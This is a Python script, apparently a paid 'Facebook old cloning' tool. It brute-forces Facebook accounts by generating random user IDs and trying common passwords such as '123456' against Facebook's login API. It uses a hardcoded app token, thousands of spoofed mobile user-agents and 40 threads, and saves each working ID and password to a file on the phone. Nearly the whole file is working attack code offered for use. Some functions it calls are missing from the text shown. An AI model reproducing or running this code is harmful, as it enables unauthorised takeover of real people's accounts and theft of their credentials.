for txret in range (10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.choice(['9','10','11','12','13','14','15'])
        c='RMX2156 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
        d=random.randrange(40,115)
        e='0'
        f=random.randrange(3000,6000)
        g=random.randrange(20,100)
        h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/313.0.0.7.110;]'
        ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
        ugen.append(ffg)
for txoppt in range (10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.choice(['9','10','11','12','13','14','15'])
        c='CPH1969 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
        d=random.randrange(40,115)
        e='0'
        f=random.randrange(3000,6000)
        g=random.randrange(20,250)
        h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/344.0.0.10.83;]'
        ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
        ugen.append(ffg)
nka = ["NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1","NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0","nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",]
for xccd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for xxdtf in range(100):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xtd in range(5000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(uaku2)
for xz in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen.append(uaku)
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for xdx in range(3000):
        build_nokiax = ['JDQ39','JZO54K']
        rr = random.randint; rc = random.choice
        miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
        miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
        miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
        aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
        basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
        gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P1000CWAXSA','GT-P1010']
        ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
        ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
        ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
        memekk = random.choice([ugent1, ugent2, ugent3])
        ugen.append(memekk)
for xffd in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen.append(uaku)
        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile/15E148 Safari/605.1'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for t in range(10000):
        aa='Mozilla/5.0 (Linux; Android 7.0; '
        b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
        c='Hisense F102) '
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
#---------------------[ COLOUR ]---------------------#
green="\033[1;32m";white="\x1b[1;97m";red="\x1b[38;5;160m";cyan="\033[1;36m" 
W = '\033[1;37m'  # White
G = '\033[1;32m'  # Green
R = '\033[1;31m'  # Red
Y = '\033[1;33m'  # Yellow
C = '\033[1;36m'  # Cyan
N = '\033[0m'     # Reset
#---------------------[ STYLE ]---------------------#
xd = f"{white}[{green}={white}]";xd1=f"{white}[{green}1{white}]";xd2=f"{white}[{green}2{white}]";xd0=f"{white}[{green}0{white}]";xdx=f"{white}[{green}?{white}]"
#---------------------[ CLEAR ]---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{white}{47*'-'}")

#---------------------[ LOGO ]---------------------#
logo = f'''\n      {cyan}
$$$$$$\  $$$$$$$$\ $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\       
$$  __$$\ $$  _____|$$  _____|$$  __$$\ $$  __$$\\__$$  __|      
$$ /  \__|$$ |      $$ |      $$ |  $$ |$$ /  $$ |  $$ |         
\$$$$$$\  $$$$$\    $$$$$\    $$$$$$$  |$$$$$$$$ |  $$ |         
 \____$$\ $$  __|   $$  __|   $$  __$$< $$  __$$ |  $$ |         
$$\   $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |  $$ |         
\$$$$$$  |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |         
 \______/ \________|\________|\__|  \__|\__|  \__|  \__|         
                                                                 
                                                                 
                                                                     
                
 UNSTOPPABLE CLICKERBAAZ TRIICKS BY SEERAT BRAND 😈                                                                 
                                           
{C}───────────────────────────────────────────────────────
{C}| {G}DEVELOPER {W}➤ SEERAT BRAND 
{C}| {G}GITHUB    {W}➤ SEERAT 
{C}| {G}VERSION   {W}➤ 2.0
{C}| {G}APPROVAL  {W}➤ ONLY PAID 
{C}| {G}FACEBOOK  {W}➤ https://www.facebook.com/Seeratgilhotra23700
{C}| {G}YOUTUBE   {W}➤ https://www.youtube.com/@Trick-by-punjabi-seerat-rulex
{C}| {G}TOOLS     {W}➤ FACEBOOK OLD CLONING
{C}| {G}WATSAPP   {W}➤ +919234735585
{C}──────────────────────────────────────────────────────'''
#---------------------[ MAIN MENU ]---------------------#
def ____main_____():
        clear();print(f"{xd1} START OLD UID CRACK ");print(f"{xd0} EXIT OLD UID CRACK ");linex();___option___=input(f'{xdx} SELECTED : ')
        if ___option___ in ['1']:os.system('xdg-open https://chat.whatsapp.com/DvYMkZ9dyOR98KRlPGXw0I?mode=wwt');_____OLD_____()
        else:exit(f'{xd} WRONG OPTION SELECTED BROH.....! ')
#---------------------[ OLD UID MENU ]---------------------#
def _____OLD_____():
        clear();os.system('xdg-open https://chat.whatsapp.com/DvYMkZ9dyOR98KRlPGXw0I?mode=wwt');print(f'{xd} EXAMPLE : 5555 | 7777 | 9999 | 99999 ');linex();limit = int(input(f'{xdx} ENTER CRACK LIMIT : '))
        ___pot___ = "10000"
        for ixx in range(int(limit)):khalifa=str(random.choice(range(1000000000,1999999999)));user.append(khalifa)
        with ThreadPool(max_workers=40) as ____iloveyou____:
                clear();tl=str(len(user))
                print(f'{xd} TOTAL CRACK LIMIT :{green} {tl} ');print(f'{xd} YOUR CRACK STARTED........ ');linex()
                for lover in user:
                        ids = ___pot___+lover
                        passlist = ["123456","1234567","12345678","123456789","123123","143143"]
                        ____iloveyou____.submit(_____method_____,ids,passlist)
        linex();print(f"{white}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK UID :{green} ' + str(len(oks)));print(f"{white}{47*'-'}");exit()
#---------------------[ OLD METHOD ]---------------------#
def _____method_____(ids,passlist):
    global loop,oks
    sys.stdout.write(f'\r\r\033[1;37m[SEERAT-XD] %s|\033[1;32mOK:-%s '%(loop,len(oks)));sys.stdout.flush()
    _____mrpoco_____ = random.choice(ugen)
    try:
        for pas in passlist:
            data = {'adid':str(uuid.uuid4()),'email':ids,'password':pas,'cpl':'true','credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale":"en_US","client_country_code":"US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"};head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(20000,40000)),'X-FB-Connection-Type': 'WIFI','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':_____mrpoco_____,'x-fb-net-hni':str(random.randint(20000,40000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','accept-encoding':'gzip, deflate','x-fb-http-engine':'Liger'};url = "https://graph.facebook.com/auth/login"
            response = requests.post(url,data=data,headers=head,verify=True).json()
            if "access_token" in response:
                print('\r\r\033[1;32m[SEERAT-XD-OK] '+ids+' | '+pas+'\033[1;97m')
                open("/sdcard/SEERAT-XD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                oks.append(ids)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print('\r\r\033[1;32m[SEERAT-XD-OK] '+ids+' | '+pas+'\033[1;97m')
                open("/sdcard/SEERAT-XD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                oks.append(ids)
                break
            else:continue
        loop+=1
    except:pass

# ------------------------------
# Main Function with Approval
# ------------------------------
def main():
    shivam_banner()  # show initially in case approval fails for visual

    if approval_check_online():
        # Show premium banner after approval
        premium_start_screen()
        ____main_____()
    else:
        # On failure, keep banner and exit
        print(f"\n{RED}❌ Program terminated. Please get approval first.{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
